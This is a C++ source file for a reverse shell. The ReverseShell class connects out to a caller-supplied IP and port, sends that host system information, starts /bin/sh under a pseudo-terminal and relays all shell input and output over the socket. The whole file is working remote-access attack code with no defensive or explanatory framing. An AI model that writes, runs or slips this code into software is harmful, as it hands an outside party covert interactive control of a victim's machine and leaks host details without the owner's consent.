#include "ReverseShell.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pty.h>
#include <iostream>
#include <cstring>
#include <poll.h>

ReverseShell::ReverseShell(const std::string& ip, int port)
    : conn(ip, port), sysInfo(conn) {}

void ReverseShell::run() {
    if (conn.establish()) {
        sysInfo.sendSystemInfo();

        int pty_fd;
        pid_t pid = forkpty(&pty_fd, nullptr, nullptr, nullptr);

        if (pid == -1) {
            std::cerr << "forkpty failed\n";
            return;
        } else if (pid == 0) {
            execl("/bin/sh", "sh", nullptr);
        } else {
            handleShell(conn.getSocketFd(), pty_fd);
        }
    }
}

void ReverseShell::handleShell(int sockfd, int pty_fd) {
    char buffer[1024];
    ssize_t n;
    struct pollfd fds[2];

    fds[0].fd = pty_fd;
    fds[0].events = POLLIN;
    fds[1].fd = sockfd;
    fds[1].events = POLLIN;

    while (true) {
        int ret = poll(fds, 2, -1);

        if (ret > 0) {
            if (fds[0].revents & POLLIN) {
                n = read(pty_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                send(sockfd, buffer, n, 0);
            }

            if (fds[1].revents & POLLIN) {
                n = recv(sockfd, buffer, sizeof(buffer), 0);
                if (n <= 0) break;
                write(pty_fd, buffer, n);
            }
        }
    }
}
